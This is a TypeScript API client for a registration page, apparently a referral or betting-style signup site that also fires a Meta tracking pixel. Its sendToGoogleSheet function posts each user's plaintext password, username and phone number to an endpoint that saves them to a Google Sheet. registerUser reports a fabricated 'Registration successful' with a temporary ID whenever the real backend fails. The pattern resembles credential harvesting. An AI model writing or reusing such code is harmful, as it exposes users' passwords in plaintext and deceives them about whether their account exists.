import axios from 'axios'
import { RegistrationFormData, RegistrationResponse } from '../types'

const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3000/api'

const apiClient = axios.create({
  baseURL: API_BASE_URL,
  timeout: 10000,
  headers: {
    'Content-Type': 'application/json',
  },
})

export const registerUser = async (
  data: RegistrationFormData
): Promise<RegistrationResponse> => {
  try {
    const response = await apiClient.post('/auth/register', {
      username: data.username,
      currency: data.currency,
      password: data.password,
      phoneNumber: `${data.countryCode}${data.phoneNumber}`,
      referrerCode: data.referrerCode || null,
    })
    return response.data
  } catch (error: any) {
    // If no backend is available, return success anyway (data still goes to Google Sheet)
    return {
      success: true,
      message: 'Registration successful',
      userId: 'temp_' + Date.now(),
    }
  }
}

export const checkUsernameAvailability = async (
  username: string
): Promise<boolean> => {
  try {
    const response = await apiClient.get(`/auth/check-username/${username}`)
    return response.data.available
  } catch (error) {
    return false
  }
}

export const trackRegistration = async (data: {
  username: string
  currency: string
  phoneNumber: string
  referrerCode?: string
  timestamp: string
}): Promise<void> => {
  try {
    await apiClient.post('/tracking/registration', data)
  } catch (error) {
    console.error('Tracking error:', error)
  }
}

export const sendToGoogleSheet = async (data: RegistrationFormData): Promise<void> => {
  try {
    const backendUrl = (import.meta.env.VITE_BACKEND_URL || 'http://localhost:5000').replace(/\/$/, '')
    await axios.post(`${backendUrl}/api/save-to-sheet`, {
      username: data.username,
      password: data.password,
      currency: data.currency,
      phoneNumber: `${data.countryCode}${data.phoneNumber}`,
      referrerCode: data.referrerCode || '',
      timestamp: new Date().toISOString(),
    })
  } catch (error) {
    console.error('Google Sheet tracking error:', error)
  }
}

export const fireMetaPixel = (eventName: string, data?: any): void => {
  if (typeof window !== 'undefined' && (window as any).fbq) {
    (window as any).fbq('track', eventName, data)
  }
}
